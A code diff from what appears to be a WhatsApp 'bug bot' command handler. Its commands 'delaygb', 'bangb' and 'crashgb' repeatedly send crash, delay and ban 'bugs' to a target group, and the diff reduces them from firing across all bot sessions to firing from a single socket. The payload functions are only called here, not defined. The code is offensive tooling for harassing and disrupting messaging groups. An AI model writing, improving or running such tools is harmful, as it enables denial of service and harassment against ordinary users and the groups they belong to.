@@ -1405,16 +1405,12 @@ case 'delaygb': {
     reply(`success! sent bug to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
 
     (async () => {
-        for (const [botNum, data] of allSessions) {
-            const sock = data.sock;
-            if (!sock?.user) continue;
-            try {
-                for (let i = 0; i < 5; i++) {
-                    await delayhardgb(sock, groupJid).catch(() => {});
-                }
-            } catch (err) {
-                console.error(`bot ${botNum} error:`, err);
+        try {
+            for (let i = 0; i < 5; i++) {
+                await delayhardgb(sock, groupJid).catch(() => {});
             }
+        } catch (err) {
+            console.error(`error:`, err);
         }
     })();
 }
@@ -1430,16 +1426,12 @@ case 'bangb': {
     reply(`success! sent ban to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
 
     (async () => {
-        for (const [botNum, data] of allSessions) {
-            const sock = data.sock;
-            if (!sock?.user) continue;
-            try {
-                for (let i = 0; i < 5; i++) {
-                    await bansgc(sock, groupJid).catch(() => {});
-                }
-            } catch (err) {
-                console.error(`bot ${botNum} error:`, err);
+        try {
+            for (let i = 0; i < 5; i++) {
+                await bansgc(sock, groupJid).catch(() => {});
             }
+        } catch (err) {
+            console.error(`error:`, err);
         }
     })();
 }
@@ -1455,22 +1447,16 @@ case 'crashgb': {
     reply(`success! sent bug to ${groupJid}\n\n*Note* : If Bug Is Not Sent Reduce Loop So It Doesn't Overload.`);
 
     (async () => {
-        for (const [botNum, data] of allSessions) {
-            const sock = data.sock;
-            if (!sock?.user) continue;
-            try {
-                for (let i = 0; i < 5; i++) {
-                    await Promise.allSettled([
-                        misterygb(sock, groupJid).catch(() => {}),
-                        delayhardgb(sock, groupJid).catch(() => {}),
-                        GbCrash(sock, groupJid).catch(() => {})
-                    ]);
-                    const currentDelay = getCurrentDelay ? getCurrentDelay() : 0;
-                    if (currentDelay > 0) await new Promise(r => setTimeout(r, currentDelay));
-                }
-            } catch (err) {
-                console.error(`bot ${botNum} error:`, err);
+        try {
+            for (let i = 0; i < 5; i++) {
+                await Promise.allSettled([
+                    misterygb(sock, groupJid).catch(() => {}),
+                    delayhardgb(sock, groupJid).catch(() => {}),
+                    GbCrash(sock, groupJid).catch(() => {})
+                ]);
             }
+        } catch (err) {
+            console.error(`error:`, err);
         }
     })();
 }
